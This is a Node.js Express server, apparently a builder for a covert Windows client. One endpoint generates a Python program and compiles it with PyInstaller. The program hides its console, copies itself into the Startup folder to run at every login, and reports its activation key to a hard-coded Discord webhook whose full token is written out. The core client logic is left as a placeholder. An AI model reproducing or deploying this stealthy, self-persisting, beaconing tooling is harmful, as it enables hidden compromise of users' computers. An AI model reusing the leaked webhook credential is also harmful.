const express = require('express');
const { spawn } = require('child_process');
const fs = require('fs');
const app = express();
app.use(express.json());
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1395555202001539092/SyTWjng_alB0tJCtmLiDBLF7u8b4C-iMLiQ8SV_pHF_4M-ueucf62EWRzcU1iGEkhJK2";

app.post('/api/build_exe', (req, res) => {
    const key = req.body.key || require('crypto').randomBytes(4).toString('hex');
    const src = `
import os, sys, ctypes, requests
key = "${key}"
WEBHOOK = "${DISCORD_WEBHOOK}"
def hide_console():
    if sys.platform.startswith('win'):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
def create_autostart():
    if sys.platform.startswith('win'):
        autostart = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'remote_app.exe')
        if not os.path.exists(autostart):
            import shutil
            shutil.copy(sys.argv[0], autostart)
def notify_discord(event):
    try: requests.post(WEBHOOK, json={"content":f"{event}: {key}"})
    except: pass
print(f"Twój klucz: {key}")
notify_discord("Aktywacja klienta")
hide_console()
create_autostart()
# ... tu cała logika klienta PC ...
`;
    fs.writeFileSync('client_temp.py', src);
    spawn('pyinstaller', ['--onefile', '--noconsole', 'client_temp.py'])
      .on('close', () => {
        const exe = fs.readFileSync('dist/client_temp.exe');
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(exe);
      });
});

app.listen(3000);
